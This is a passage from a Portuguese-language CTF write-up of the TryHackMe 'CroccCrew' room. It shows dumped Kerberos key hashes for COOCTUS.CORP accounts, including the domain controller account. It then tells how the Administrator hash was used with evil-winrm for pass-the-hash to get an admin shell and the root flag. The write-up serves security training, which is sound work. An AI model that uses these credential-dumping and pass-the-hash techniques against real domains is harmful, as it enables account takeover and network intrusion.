COOCTUS.CORP\Ben:aes128-cts-hmac-sha1-96:59774a99d18f215d34ea1f33a27bf1fe
COOCTUS.CORP\Ben:des-cbc-md5:801c51ea8546b55d
COOCTUS.CORP\David:aes256-cts-hmac-sha1-96:be42bf5c3aa5161f7cf3f8fce60613fc08cee0c487f5a681b1eeb910bf079c74
COOCTUS.CORP\David:aes128-cts-hmac-sha1-96:6b17ec1654837569252f31fec0263522
COOCTUS.CORP\David:des-cbc-md5:e5ba4f34cd5b6dae
COOCTUS.CORP\password-reset:aes256-cts-hmac-sha1-96:cdcbd00a27dcf5e46691aac9e51657f31d7995c258ec94057774d6e011f58ecb
COOCTUS.CORP\password-reset:aes128-cts-hmac-sha1-96:bb66b50c126becf82f691dfdb5891987
COOCTUS.CORP\password-reset:des-cbc-md5:343d2c5e01b5a74f
DC$:aes256-cts-hmac-sha1-96:b8599ddadc3aab581c0d8f4413a0011cfd5575455219e9a73a688695a337a02b
DC$:aes128-cts-hmac-sha1-96:bc4fd5baa5e5cd088359ae6364df583d
DC$:des-cbc-md5:c1fd9ece52f25e7a
```
E conseguimos o dump de todas as hashes em cache, inclusive do `Administrator`!!!

Em posse da hash do Administrator, podemos utilizar o `evil-winrm` par nos autenticar com pass the hash.

<img src="/img/thm/thm-crocccrew-9.png">

E conseguimos nosso shell com o usuário Administrator!!!

No diretório `C:\Shares\Home>` encontramos todas as  duas hashes de usuários privilegiados.

<img src="/img/thm/thm-crocccrew-10.png">

Em `C:\Perflogs\Admin>` encontramos a flag `root.txt`.

<img src="/img/thm/thm-crocccrew-11.png">

<br>

E comprometemos o server!!
<br>

<img src="/htb/hackerman.gif">


